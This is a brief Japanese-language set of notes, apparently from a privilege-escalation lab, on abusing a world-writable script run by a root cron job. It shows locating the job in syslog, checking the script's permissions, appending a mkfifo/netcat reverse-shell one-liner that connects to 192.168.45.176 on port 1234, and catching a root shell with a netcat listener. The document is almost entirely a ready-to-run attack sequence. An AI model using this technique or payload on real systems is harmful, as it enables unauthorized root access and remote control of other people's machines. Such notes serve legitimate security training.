# 安全でないファイル権限
## Cronジョブの悪用
### ジョブの確認
```bash
grep "CRON" /var/log/syslog
Jul  7 09:15:15 debian-privesc CRON[1315]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
```

```bash
cat /home/joe/.scripts/user_backups.sh
```

user_backups.shの内容
```bash
#!/bin/bash
cp -rf /home/joe/ /var/backups/joe/
```

権限の確認
```bash
ls -lah /home/joe/.scripts/user_backups.sh
```

## スクリプトの改ざん
```bash
cd .scripts
```

```zsh
echo >> user_backups.sh

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.176 1234 >/tmp/f" >> user_backups.sh
```

Kali
```bash
nc -nlvp 1234

id
```